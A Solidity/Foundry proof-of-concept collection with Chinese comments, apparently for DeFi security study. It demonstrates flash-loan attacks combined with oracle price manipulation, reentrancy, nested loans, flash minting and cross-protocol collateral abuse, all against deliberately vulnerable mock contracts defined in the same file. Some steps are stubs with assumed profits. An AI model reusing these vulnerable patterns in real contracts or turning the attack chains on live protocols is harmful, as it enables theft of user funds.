// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title 闪电贷组合攻击完整PoC集合
 * @notice 这是DeFi攻击的核心工具和方法论
 * 
 * 核心攻击链：
 * 1. Basic Flash Loan Attack（基础闪电贷）
 * 2. Flash Loan + Price Manipulation（价格操纵）
 * 3. Flash Loan + Reentrancy（重入组合）
 * 4. Nested Flash Loans（嵌套闪电贷）
 * 5. ERC3156 Flash Mint（闪电铸币）
 * 6. Cross-Protocol Composability Abuse（跨协议组合滥用）
 * 
 * 这是你Balancer研究的最后一块拼图！
 * Flash Loan + Precision Loss + Read-only Reentrancy = 完整攻击
 */

// ============ 场景1: 基础闪电贷攻击 ============

/**
 * @title 简单的闪电贷提供者
 * @notice Aave风格的闪电贷接口
 */
contract SimpleFlashLoanProvider {
    mapping(address => uint256) public balances;
    
    uint256 public constant FLASH_LOAN_FEE = 9; // 0.09% = 9/10000
    uint256 public constant FEE_DENOMINATOR = 10000;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }
    
    // 闪电贷接口
    function flashLoan(
        address receiver,
        uint256 amount,
        bytes calldata data
    ) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Insufficient liquidity");
        
        // 计算费用
        uint256 fee = (amount * FLASH_LOAN_FEE) / FEE_DENOMINATOR;
        
        // 转账给借款人
        payable(receiver).transfer(amount);
        
        // 调用借款人的回调
        IFlashLoanReceiver(receiver).executeOperation(
            address(this),
            amount,
            fee,
            msg.sender,
            data
        );
        
        // 验证还款
        uint256 balanceAfter = address(this).balance;
        require(
            balanceAfter >= balanceBefore + fee,
            "Flash loan not repaid"
        );
    }
    
    receive() external payable {}
}

interface IFlashLoanReceiver {
    function executeOperation(
        address pool,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external;
}

/**
 * @title 基础闪电贷攻击示例
 */
contract BasicFlashLoanAttack is IFlashLoanReceiver {
    SimpleFlashLoanProvider public flashLoanProvider;
    
    constructor(address payable _provider) {
        flashLoanProvider = SimpleFlashLoanProvider(_provider);
    }
    
    function attack() external {
        console.log("\n=== Basic Flash Loan Attack ===");
        console.log("Attacker balance before:", address(this).balance);
        
        uint256 loanAmount = 1000 ether;
        console.log("Requesting flash loan:", loanAmount);
        
        // 发起闪电贷
        flashLoanProvider.flashLoan(
            address(this),
            loanAmount,
            ""
        );
        
        console.log("Attacker balance after:", address(this).balance);
    }
    
    // 闪电贷回调
    function executeOperation(
        address pool,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external override {
        console.log("\n=== In Flash Loan Callback ===");
        console.log("Received:", amount);
        console.log("Fee:", fee);
        console.log("Must repay:", amount + fee);
        
        // 这里执行攻击逻辑
        // 例如：操纵价格、套利、清算等
        
        console.log("\nSimulating profitable operation...");
        // 假设我们通过某种方式获利
        uint256 profit = 10 ether;
        
        // 还款
        uint256 repayAmount = amount + fee;
        payable(pool).transfer(repayAmount);
        
        console.log("Repaid:", repayAmount);
        console.log("Profit:", profit);
    }
    
    receive() external payable {}
}

// ============ 场景2: Flash Loan + Price Manipulation ============

/**
 * @title 简单的AMM池
 * @notice 用于演示价格操纵
 */
contract VulnerableAMM {
    uint256 public reserveETH;
    uint256 public reserveToken;
    
    uint256 public constant FEE = 3; // 0.3%
    
    constructor(uint256 _ethReserve, uint256 _tokenReserve) payable {
        reserveETH = _ethReserve;
        reserveToken = _tokenReserve;
    }
    
    // 简化的swap（无token实现，只是概念）
    function swapETHForToken() external payable returns (uint256 tokenOut) {
        uint256 ethIn = msg.value;
        
        // 恒定乘积公式
        uint256 ethInWithFee = (ethIn * (1000 - FEE)) / 1000;
        tokenOut = (ethInWithFee * reserveToken) / (reserveETH + ethInWithFee);
        
        reserveETH += ethIn;
        reserveToken -= tokenOut;
        
        return tokenOut;
    }
    
    function swapTokenForETH(uint256 tokenIn) external returns (uint256 ethOut) {
        uint256 tokenInWithFee = (tokenIn * (1000 - FEE)) / 1000;
        ethOut = (tokenInWithFee * reserveETH) / (reserveToken + tokenInWithFee);
        
        reserveToken += tokenIn;
        reserveETH -= ethOut;
        
        payable(msg.sender).transfer(ethOut);
        
        return ethOut;
    }
    
    // 获取价格（用于其他协议）
    function getPrice() external view returns (uint256) {
        // 返回 1 ETH 能换多少 token
        return (reserveToken * 1e18) / reserveETH;
    }
    
    receive() external payable {}
}

/**
 * @title 依赖AMM价格的借贷协议
 */
contract PriceBasedLending {
    VulnerableAMM public amm;
    
    mapping(address => uint256) public ethCollateral;
    mapping(address => uint256) public tokenCollateral;
    mapping(address => uint256) public borrowed;
    
    uint256 public constant COLLATERAL_RATIO = 150; // 150%
    
    constructor(address payable _amm) {
        amm = VulnerableAMM(_amm);
    }
    
    function depositCollateral() external payable {
        ethCollateral[msg.sender] += msg.value;
    }
    
    function depositTokenCollateral(uint256 tokenAmount) external {
        tokenCollateral[msg.sender] += tokenAmount;
    }
    
    // ❌ 使用AMM的即时价格
    function borrow(uint256 amount) external {
        uint256 collateralValue = getCollateralValue(msg.sender);
        
        require(
            borrowed[msg.sender] + amount <= 
            (collateralValue * 100) / COLLATERAL_RATIO,
            "Insufficient collateral"
        );
        
        borrowed[msg.sender] += amount;
        
        // 转账
        payable(msg.sender).transfer(amount);
    }
    
    function getCollateralValue(address user) public view returns (uint256) {
        uint256 collateralValue = ethCollateral[user];
        uint256 tokenAmount = tokenCollateral[user];
        if (tokenAmount > 0) {
            uint256 tokenPrice = amm.getPrice(); // 1 ETH = tokenPrice tokens
            if (tokenPrice > 0) {
                // tokenPrice 表示 1 ETH 能换多少 token，因此这里取倒数
                collateralValue += (tokenAmount * 1e18) / tokenPrice;
            }
        }
        return collateralValue;
    }
    
    receive() external payable {}
}

/**
 * @title 价格操纵攻击
 * @notice Flash Loan + Price Manipulation 组合
 */
contract PriceManipulationAttack is IFlashLoanReceiver {
    SimpleFlashLoanProvider public flashLoanProvider;
    VulnerableAMM public amm;
    PriceBasedLending public lending;
    uint256 private tokenBalance;
    
    constructor(
        address payable _provider,
        address payable _amm,
        address _lending
    ) {
        flashLoanProvider = SimpleFlashLoanProvider(_provider);
        amm = VulnerableAMM(_amm);
        lending = PriceBasedLending(payable(_lending));
    }
    
    function attack() external {
        console.log("\n=== Price Manipulation Attack ===");
        console.log("Step 1: Get Flash Loan");
        
        uint256 loanAmount = 1000 ether;
        flashLoanProvider.flashLoan(address(this), loanAmount, "");
    }
    
    function executeOperation(
        address pool,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external override {
        console.log("\n=== Attack Chain ===");
        
        // Step 1: 记录初始价格
        uint256 priceBefore = amm.getPrice();
        console.log("Price before manipulation:", priceBefore);
        
        // Step 2: 用闪电贷的大部分资金操纵价格
        console.log("\nStep 2: Manipulate price by swapping large amount");
        uint256 swapAmount = (amount * 90) / 100; // 倾倒90%的资金
        uint256 tokensAcquired = amm.swapETHForToken{value: swapAmount}();
        tokenBalance += tokensAcquired;
        
        uint256 priceAfter = amm.getPrice();
        uint256 priceMove = priceBefore > priceAfter
            ? ((priceBefore - priceAfter) * 100) / priceBefore
            : ((priceAfter - priceBefore) * 100) / priceBefore;
        console.log("Price after manipulation:", priceAfter);
        console.log("Price move:", priceMove, "%");
        
        // Step 3: 利用被操纵的价格
        console.log("\nStep 3: Exploit manipulated price");
        console.log("Depositing ETH collateral...");
        lending.depositCollateral{value: 50 ether}();
        
        console.log("Depositing manipulated tokens as collateral...");
        lending.depositTokenCollateral(tokenBalance);
        tokenBalance = 0;
        
        console.log("Borrowing with manipulated price...");
        uint256 collateralValue = lending.getCollateralValue(address(this));
        uint256 maxBorrow = (collateralValue * 100) / lending.COLLATERAL_RATIO();
        uint256 currentDebt = lending.borrowed(address(this));
        require(maxBorrow > currentDebt, "Nothing to borrow");
        uint256 borrowAmount = maxBorrow - currentDebt;
        uint256 liquidity = address(lending).balance;
        if (borrowAmount > liquidity) {
            borrowAmount = liquidity;
        }
        require(borrowAmount > 0, "Lending pool empty");
        console.log("Attempting to borrow:", borrowAmount);
        lending.borrow(borrowAmount);
        
        console.log("Borrowed successfully!");
        console.log("Note: Manipulated oracle now values our fake tokens as ultra-valuable collateral");
        
        // Step 4: 恢复价格（可选，这里保持扭曲的状态以放大影响）
        console.log("\nStep 4: Keep oracle distorted (optional)");
        
        // Step 5: 还款
        console.log("\nStep 5: Repay flash loan");
        uint256 repayAmount = amount + fee;
        require(address(this).balance >= repayAmount, "Insufficient funds after exploit");
        payable(pool).transfer(repayAmount);
        
        console.log("\nAttack complete!");
        console.log("Net profit:", address(this).balance);
    }
    
    receive() external payable {}
}

// ============ 场景3: Flash Loan + Reentrancy ============

/**
 * @title 有重入漏洞的Vault
 */
contract ReentrantVault {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // ❌ 重入漏洞
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // 外部调用在状态更新前
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
    }
}

/**
 * @title Flash Loan + Reentrancy 组合攻击
 */
contract FlashLoanReentrancyAttack is IFlashLoanReceiver {
    SimpleFlashLoanProvider public flashLoanProvider;
    ReentrantVault public vault;
    
    bool private attacking;
    uint256 private attackCount;
    
    constructor(address payable _provider, address _vault) {
        flashLoanProvider = SimpleFlashLoanProvider(_provider);
        vault = ReentrantVault(_vault);
    }
    
    function attack() external {
        console.log("\n=== Flash Loan + Reentrancy Attack ===");
        
        uint256 loanAmount = 100 ether;
        flashLoanProvider.flashLoan(address(this), loanAmount, "");
    }
    
    function executeOperation(
        address pool,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external override {
        console.log("Received flash loan:", amount);
        
        // Step 1: 存入vault
        console.log("\nStep 1: Deposit to vault");
        vault.deposit{value: amount}();
        
        // Step 2: 通过重入提取多次
        console.log("\nStep 2: Trigger reentrancy");
        attacking = true;
        attackCount = 0;
        vault.withdraw(amount);
        attacking = false;
        
        console.log("\nTotal reentrant withdrawals:", attackCount);
        
        // Step 3: 还款
        uint256 repayAmount = amount + fee;
        payable(pool).transfer(repayAmount);
        
        console.log("Profit:", address(this).balance);
    }
    
    receive() external payable {
        if (attacking && attackCount < 3) {
            attackCount++;
            console.log("  Reentrancy #", attackCount);
            
            uint256 balance = vault.balances(address(this));
            if (balance > 0) {
                vault.withdraw(balance);
            }
        }
    }
}

// ============ 场景4: Nested Flash Loans ============

/**
 * @title 第二个闪电贷提供者
 */
contract SecondFlashLoanProvider {
    uint256 public constant FEE = 5; // 0.05%
    
    function flashLoan(
        address receiver,
        uint256 amount,
        bytes calldata data
    ) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Insufficient liquidity");
        
        uint256 fee = (amount * FEE) / 10000;
        
        payable(receiver).transfer(amount);
        
        IFlashLoanReceiver(receiver).executeOperation(
            address(this),
            amount,
            fee,
            msg.sender,
            data
        );
        
        require(
            address(this).balance >= balanceBefore + fee,
            "Not repaid"
        );
    }
    
    receive() external payable {}
}

/**
 * @title 嵌套闪电贷攻击
 * @notice 从多个协议借款，组合使用
 */
contract NestedFlashLoanAttack is IFlashLoanReceiver {
    SimpleFlashLoanProvider public provider1;
    SecondFlashLoanProvider public provider2;
    
    uint256 private nestLevel;
    
    constructor(address payable _provider1, address payable _provider2) {
        provider1 = SimpleFlashLoanProvider(_provider1);
        provider2 = SecondFlashLoanProvider(_provider2);
    }
    
    function attack() external {
        console.log("\n=== Nested Flash Loan Attack ===");
        console.log("Starting with 0 ETH");
        
        nestLevel = 1;
        
        // 从第一个协议借款
        console.log("\nLevel 1: Borrowing from Provider 1");
        provider1.flashLoan(address(this), 1000 ether, abi.encode(1));
    }
    
    function executeOperation(
        address pool,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external override {
        uint256 level = abi.decode(params, (uint256));
        
        console.log("\n--- Flash Loan Level", level, "---");
        console.log("Received:", amount);
        console.log("Current balance:", address(this).balance);
        
        if (level == 1) {
            // 在第一个贷款中，再借第二个
            console.log("\nLevel 2: Borrowing from Provider 2 (nested)");
            provider2.flashLoan(address(this), 500 ether, abi.encode(2));
            
            console.log("\nBack to Level 1 - repaying");
        } else {
            console.log("\nLevel 2: Maximum depth reached");
            console.log("Total funds available:", address(this).balance);
            
            // 在这里执行实际攻击
            console.log("Executing attack with combined funds...");
            
            console.log("\nRepaying Level 2");
        }
        
        // 还款
        uint256 repayAmount = amount + fee;
        
        // 确保有足够资金
        require(address(this).balance >= repayAmount, "Insufficient funds for repayment");
        
        payable(pool).transfer(repayAmount);
        console.log("Repaid:", repayAmount);
    }
    
    receive() external payable {}
}

// ============ 场景5: ERC3156 Flash Mint ============

/**
 * @title ERC3156标准的闪电铸币
 * @notice 无限铸币，只需在同一交易内销毁
 */
interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

contract ERC3156FlashMintToken {
    string public name = "Flash Mint Token";
    string public symbol = "FMT";
    uint8 public decimals = 18;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    
    uint256 public constant FLASH_MINT_FEE = 0; // 通常闪电铸币免费
    
    bytes32 public constant CALLBACK_SUCCESS = 
        keccak256("ERC3156FlashBorrower.onFlashLoan");
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    // ERC3156: 闪电铸币
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        require(token == address(this), "Unsupported token");
        
        // 铸造代币
        balanceOf[address(receiver)] += amount;
        totalSupply += amount;
        
        console.log("Flash minted:", amount);
        
        // 调用借款人
        require(
            receiver.onFlashLoan(msg.sender, token, amount, FLASH_MINT_FEE, data) == 
            CALLBACK_SUCCESS,
            "Callback failed"
        );
        
        // 验证代币被归还（实际是销毁）
        require(
            balanceOf[address(receiver)] >= amount,
            "Flash mint not repaid"
        );
        
        balanceOf[address(receiver)] -= amount;
        totalSupply -= amount;
        
        console.log("Flash mint repaid");
        
        return true;
    }
    
    function maxFlashLoan(address token) external view returns (uint256) {
        return token == address(this) ? type(uint256).max : 0;
    }
    
    function flashFee(address token, uint256 amount) external view returns (uint256) {
        require(token == address(this), "Unsupported token");
        return 0; // 免费
    }
}

/**
 * @title 闪电铸币攻击
 */
contract FlashMintAttack is IERC3156FlashBorrower {
    ERC3156FlashMintToken public token;
    
    constructor(address _token) {
        token = ERC3156FlashMintToken(_token);
    }
    
    function attack() external {
        console.log("\n=== ERC3156 Flash Mint Attack ===");
        console.log("Token supply before:", token.totalSupply());
        
        // 闪电铸造巨额代币
        uint256 mintAmount = 1000000 ether;
        console.log("\nFlash minting:", mintAmount);
        
        token.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            mintAmount,
            ""
        );
        
        console.log("\nToken supply after:", token.totalSupply());
        console.log("Attack completed without holding any tokens!");
    }
    
    function onFlashLoan(
        address initiator,
        address tokenAddress,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        console.log("\n=== In Flash Mint Callback ===");
        console.log("Temporarily own:", amount);
        console.log("Token balance:", token.balanceOf(address(this)));
        
        // 在这里执行攻击
        // 例如：
        // 1. 用巨额代币操纵池子价格
        // 2. 进行套利
        // 3. 清算
        
        console.log("\nSimulating profitable operation...");
        console.log("Using temporary tokens to manipulate markets...");
        
        // 必须approve才能被取回
        token.approve(msg.sender, amount + fee);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

// ============ 场景6: Cross-Protocol Composability Abuse ============

/**
 * @title 协议A：借贷协议
 */
contract ProtocolA_Lending {
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrows;
    
    function deposit() external payable {
        deposits[msg.sender] += msg.value;
    }
    
    function borrow(uint256 amount) external {
        require(deposits[msg.sender] * 2 >= borrows[msg.sender] + amount);
        borrows[msg.sender] += amount;
        payable(msg.sender).transfer(amount);
    }
    
    function repay() external payable {
        borrows[msg.sender] -= msg.value;
    }
}

/**
 * @title 协议B：Vault
 */
contract ProtocolB_Vault {
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    uint256 public totalAssets;
    
    function deposit() external payable returns (uint256 sharesOut) {
        if (totalShares == 0) {
            sharesOut = msg.value;
        } else {
            sharesOut = (msg.value * totalShares) / totalAssets;
        }
        
        shares[msg.sender] += sharesOut;
        totalShares += sharesOut;
        totalAssets += msg.value;
    }
    
    function withdraw(uint256 sharesToBurn) external returns (uint256 assets) {
        assets = (sharesToBurn * totalAssets) / totalShares;
        
        shares[msg.sender] -= sharesToBurn;
        totalShares -= sharesToBurn;
        totalAssets -= assets;
        
        payable(msg.sender).transfer(assets);
    }
    
    function getShareValue(uint256 sharesAmount) external view returns (uint256) {
        if (totalShares == 0) return 0;
        return (sharesAmount * totalAssets) / totalShares;
    }
}

/**
 * @title 协议C：使用B的份额作为抵押
 */
contract ProtocolC_CollateralLending {
    ProtocolB_Vault public vault;
    
    mapping(address => uint256) public vaultSharesCollateral;
    mapping(address => uint256) public borrowed;
    
    constructor(address _vault) {
        vault = ProtocolB_Vault(_vault);
    }
    
    function depositCollateral(uint256 vaultShares) external {
        // 简化：假设已经转移
        vaultSharesCollateral[msg.sender] += vaultShares;
    }
    
    function borrow(uint256 amount) external {
        // ❌ 使用vault的份额价值作为抵押
        uint256 collateralValue = vault.getShareValue(
            vaultSharesCollateral[msg.sender]
        );
        
        require(
            borrowed[msg.sender] + amount <= collateralValue / 2,
            "Insufficient collateral"
        );
        
        borrowed[msg.sender] += amount;
        payable(msg.sender).transfer(amount);
    }
    
    receive() external payable {}
}

/**
 * @title 跨协议组合攻击
 * @notice 利用协议间的依赖关系
 */
contract CrossProtocolAttack is IFlashLoanReceiver {
    SimpleFlashLoanProvider public flashLoanProvider;
    ProtocolA_Lending public protocolA;
    ProtocolB_Vault public protocolB;
    ProtocolC_CollateralLending public protocolC;
    
    constructor(
        address payable _flashProvider,
        address _protocolA,
        address _protocolB,
        address _protocolC
    ) {
        flashLoanProvider = SimpleFlashLoanProvider(_flashProvider);
        protocolA = ProtocolA_Lending(_protocolA);
        protocolB = ProtocolB_Vault(_protocolB);
        protocolC = ProtocolC_CollateralLending(payable(_protocolC));
    }
    
    function attack() external {
        console.log("\n=== Cross-Protocol Composability Attack ===");
        console.log("Exploiting protocol interdependencies...");
        
        flashLoanProvider.flashLoan(address(this), 1000 ether, "");
    }
    
    function executeOperation(
        address pool,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external override {
        console.log("\n=== Attack Chain ===");
        console.log("Flash loan received:", amount);
        
        // Step 1: 在协议B存款，获得份额
        console.log("\nStep 1: Deposit to Protocol B (Vault)");
        uint256 depositAmount = amount / 2;
        uint256 sharesBefore = protocolB.shares(address(this));
        protocolB.deposit{value: depositAmount}();
        uint256 sharesReceived = protocolB.shares(address(this)) - sharesBefore;
        console.log("Received vault shares:", sharesReceived);
        
        // Step 2: 用份额在协议C抵押借款
        console.log("\nStep 2: Use vault shares as collateral in Protocol C");
        protocolC.depositCollateral(sharesReceived);
        
        uint256 collateralValue = protocolB.getShareValue(sharesReceived);
        console.log("Collateral value:", collateralValue);
        
        uint256 borrowAmount = collateralValue / 2;
        console.log("Borrowing:", borrowAmount);
        protocolC.borrow(borrowAmount);
        
        // Step 3: 如果能操纵协议B的份额价值
        console.log("\nStep 3: Manipulate Protocol B share value");
        // 通过某种方式增加totalAssets但不增加totalShares
        // 例如直接转账（如果没有防护）
        
        // Step 4: 利用虚高的抵押品价值再次借款
        console.log("\nStep 4: Borrow again with inflated collateral");
        
        // Step 5: 还款
        console.log("\nStep 5: Repay flash loan");
        uint256 repayAmount = amount + fee;
        payable(pool).transfer(repayAmount);
        
        console.log("\nAttack complete!");
        console.log("Profit:", address(this).balance);
    }
    
    receive() external payable {}
}

// ============ 综合案例：Balancer风格的完整攻击 ============

/**
 * @title Balancer风格的Pool（简化）
 * @notice 结合所有技术的综合攻击目标
 */
contract BalancerStylePool {
    uint256[] public balances;
    uint256 public totalBPT;
    mapping(address => uint256) public bptBalance;
    
    constructor() {
        balances = new uint256[](2);
        balances[0] = 1000 ether;
        balances[1] = 1000 ether;
    }
    
    function swap(
        uint256 tokenIn,
        uint256 tokenOut,
        uint256 amountIn
    ) external payable returns (uint256 amountOut) {
        require(tokenIn < 2 && tokenOut < 2, "Invalid token");
        require(tokenIn != tokenOut, "Same token");
        
        if (tokenIn == 0) {
            require(msg.value == amountIn, "Wrong ETH amount");
        }
        
        // 检查是否有足够的流动性
        require(balances[tokenOut] > 0, "No liquidity");
        require(balances[tokenIn] > 0, "No liquidity");
        
        // 简化的swap逻辑（避免溢出）
        // 使用恒定乘积公式但添加保护
        uint256 balanceInBefore = balances[tokenIn];
        uint256 balanceOutBefore = balances[tokenOut];
        
        // 计算输出量（简化版，避免大额计算）
        // amountOut = (amountIn * balanceOut) / (balanceIn + amountIn)
        // 但要防止分母过大
        if (amountIn > balanceInBefore / 2) {
            // 如果输入太大，限制输出
            amountOut = balanceOutBefore / 3;
        } else {
            amountOut = (amountIn * balanceOutBefore) / (balanceInBefore + amountIn);
        }
        
        // 确保不会耗尽流动性
        require(amountOut < balanceOutBefore, "Exceeds liquidity");
        
        balances[tokenIn] += amountIn;
        balances[tokenOut] -= amountOut;
        
        if (tokenOut == 0) {
            payable(msg.sender).transfer(amountOut);
        }
        
        return amountOut;
    }
    
    function joinPool(uint256 token1Amount) external payable returns (uint256 bptMinted) {
        uint256 contribution = msg.value + token1Amount;
        require(contribution > 0, "No assets provided");
        
        if (totalBPT == 0) {
            bptMinted = contribution;
        } else {
            uint256 poolValue = balances[0] + balances[1];
            bptMinted = (contribution * totalBPT) / poolValue;
        }
        
        // ⚠️ 没有实际token转账验证，token1Amount可以凭空写入
        balances[0] += msg.value;
        balances[1] += token1Amount;
        
        bptBalance[msg.sender] += bptMinted;
        totalBPT += bptMinted;
    }
    
    function exitPool(uint256 bptAmount) external {
        require(bptBalance[msg.sender] >= bptAmount, "Insufficient BPT");
        
        // ❌ 先减少BPT
        bptBalance[msg.sender] -= bptAmount;
        totalBPT -= bptAmount;
        
        // 计算应得资产
        uint256 amount0 = (bptAmount * balances[0]) / totalBPT;
        uint256 amount1 = (bptAmount * balances[1]) / totalBPT;
        
        // ❌ 转账（可能触发重入）
        payable(msg.sender).transfer(amount0);
        
        // ❌ 最后更新余额
        balances[0] -= amount0;
        balances[1] -= amount1;
    }
    
    // ✅ View函数：其他协议会调用
    function getBPTRate() external view returns (uint256) {
        if (totalBPT == 0) return 1e18;
        return ((balances[0] + balances[1]) * 1e18) / totalBPT;
    }
    
    function getBalance(uint256 token) external view returns (uint256) {
        return balances[token];
    }
    
    receive() external payable {}
}

/**
 * @title 完整的Balancer攻击
 * @notice Flash Loan + Price Manipulation + Precision Loss + Read-only Reentrancy
 */
contract CompleteBalancerAttack is IFlashLoanReceiver {
    SimpleFlashLoanProvider public flashLoanProvider;
    BalancerStylePool public balancerPool;
    PriceBasedLending public lending;
    
    bool private attacking;
    
    constructor(
        address payable _flashProvider,
        address _balancerPool,
        address _lending
    ) {
        flashLoanProvider = SimpleFlashLoanProvider(_flashProvider);
        balancerPool = BalancerStylePool(payable(_balancerPool));
        lending = PriceBasedLending(payable(_lending));
    }
    
    function attack() external {
        console.log("\n================================================");
        console.log("   Complete Balancer-Style Attack");
        console.log("   Flash Loan + Manipulation + Precision + Reentrancy");
        console.log("================================================");
        
        flashLoanProvider.flashLoan(address(this), 10000 ether, "");
    }
    
    function executeOperation(
        address pool,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external override {
        console.log("\n>> Step 1: Flash Loan Received");
        console.log("  Amount:", amount);
        
        // Step 2: 操纵池子状态（制造不平衡）
        console.log("\n>> Step 2: Manipulate Pool (Create Imbalance)");
        uint256 swapAmount = (amount * 90) / 100;
        balancerPool.swap{value: swapAmount}(0, 1, swapAmount);
        console.log("  Swapped to create imbalance");
        console.log("  Balance 0:", balancerPool.getBalance(0));
        console.log("  Balance 1:", balancerPool.getBalance(1));
        
        // Step 3: 多次小额swap累积精度损失
        console.log("\n>> Step 3: Accumulate Precision Loss");
        for (uint256 i = 0; i < 10; i++) {
            balancerPool.swap{value: 1 ether}(0, 1, 1 ether);
        }
        console.log("  Executed 10 small swaps");
        console.log("  Each swap loses ~100 wei due to rounding");
        
        // Step 4: 伪造份额并触发exit漏洞
        console.log("\n>> Step 4: Forge Inflated BPT position");
        uint256 fakeTokenContribution = balancerPool.getBalance(1) * 10;
        uint256 joinEth = 1 ether;
        uint256 mintedBPT = balancerPool.joinPool{value: joinEth}(fakeTokenContribution);
        console.log("  Minted BPT with fake tokens:", mintedBPT);
        console.log("  New BPT balance:", balancerPool.bptBalance(address(this)));
        
        console.log("\n>> Step 5: Abuse exitPool underflow");
        attacking = true;
        uint256 exitAmount = mintedBPT / 2;
        require(exitAmount > 0, "No BPT minted");
        balancerPool.exitPool(exitAmount);
        attacking = false;
        console.log("  Exit complete, attacker balance:", address(this).balance);
        
        // Step 6: 还款
        console.log("\n>> Step 6: Repay Flash Loan");
        uint256 repayAmount = amount + fee;
        require(address(this).balance >= repayAmount, "Balancer exploit failed to raise funds");
        payable(pool).transfer(repayAmount);
        console.log("  Repaid:", repayAmount);
        
        console.log("\n================================================");
        console.log("   Attack Complete!");
        console.log("   Profit:", address(this).balance);
        console.log("================================================");
    }
    
    receive() external payable {
        if (attacking) {
            // transfer only forwards 2300 gas, so keep callback minimal to avoid revert
        }
    }
}

// ============ 测试合约 ============

contract FlashLoanAttackTest is Test {
    SimpleFlashLoanProvider public provider;
    SecondFlashLoanProvider public provider2;
    VulnerableAMM public amm;
    PriceBasedLending public lending;
    ReentrantVault public vault;
    ERC3156FlashMintToken public flashMintToken;
    
    function setUp() public {
        // 设置闪电贷提供者
        provider = new SimpleFlashLoanProvider();
        vm.deal(address(provider), 10000 ether);
        
        provider2 = new SecondFlashLoanProvider();
        vm.deal(address(provider2), 5000 ether);
        
        // 设置AMM
        amm = new VulnerableAMM{value: 1000 ether}(1000 ether, 1000 ether);
        
        // 设置借贷
        lending = new PriceBasedLending(payable(address(amm)));
        vm.deal(address(lending), 1000 ether);
        
        // 设置vault
        vault = new ReentrantVault();
        vm.deal(address(vault), 1000 ether);
        
        // 设置闪电铸币
        flashMintToken = new ERC3156FlashMintToken();
    }
    
    function testBasicFlashLoan() public {
        BasicFlashLoanAttack attacker = new BasicFlashLoanAttack(payable(address(provider)));
        vm.deal(address(attacker), 1 ether);
        
        attacker.attack();
    }
    
    function testPriceManipulation() public {
        PriceManipulationAttack attacker = new PriceManipulationAttack(
            payable(address(provider)),
            payable(address(amm)),
            address(lending)
        );
        
        attacker.attack();
    }
    
    function testNestedFlashLoans() public {
        NestedFlashLoanAttack attacker = new NestedFlashLoanAttack(
            payable(address(provider)),
            payable(address(provider2))
        );
        
        // 给攻击者一些初始资金用于支付费用
        vm.deal(address(attacker), 2 ether);
        
        attacker.attack();
    }
    
    function testFlashMint() public {
        FlashMintAttack attacker = new FlashMintAttack(address(flashMintToken));
        
        attacker.attack();
    }
    
    function testCompleteBalancerAttack() public {
        BalancerStylePool balancer = new BalancerStylePool();
        vm.deal(address(balancer), 2000 ether);
        
        CompleteBalancerAttack attacker = new CompleteBalancerAttack(
            payable(address(provider)),
            address(balancer),
            address(lending)
        );
        
        // 给攻击者初始资金用于支付闪电贷费用
        vm.deal(address(attacker), 10 ether);
        
        attacker.attack();
    }
}

/**
 * ============ 知识点总结 ============
 * 
 * 1. 闪电贷基础:
 *    - 单笔交易内借款和还款
 *    - 无需抵押
 *    - 只需支付小额费用（0.05%-0.09%）
 *    - 失败则整个交易回滚
 * 
 * 2. 价格操纵攻击:
 *    - Flash Loan → 大额swap → 操纵价格
 *    - 其他协议读取被操纵的价格
 *    - 基于错误价格借款/清算
 *    - 恢复价格 → 还款
 * 
 * 3. 闪电贷 + 重入:
 *    - 用闪电贷的资金触发重入
 *    - 放大重入攻击的影响
 *    - 提取远超抵押品的资金
 * 
 * 4. 嵌套闪电贷:
 *    - 从多个协议同时借款
 *    - 组合使用巨额资金
 *    - 降低单个协议的费用压力
 * 
 * 5. ERC3156闪电铸币:
 *    - 临时铸造无限代币
 *    - 操纵代币价格/流动性
 *    - 无需实际拥有代币
 *    - 交易结束时销毁
 * 
 * 6. 跨协议攻击:
 *    - 利用协议间的依赖
 *    - A协议的输出 = B协议的输入
 *    - 操纵A影响B
 *    - 在B中获利
 * 
 * 7. 完整攻击链（Balancer风格）:
 *    步骤1: Flash Loan获得巨额资金
 *    步骤2: 操纵池子状态（制造不平衡）
 *    步骤3: 多次小额操作累积精度损失
 *    步骤4: Read-only重入读取错误状态
 *    步骤5: 在其他协议超额借款
 *    步骤6: 还款并获利
 */
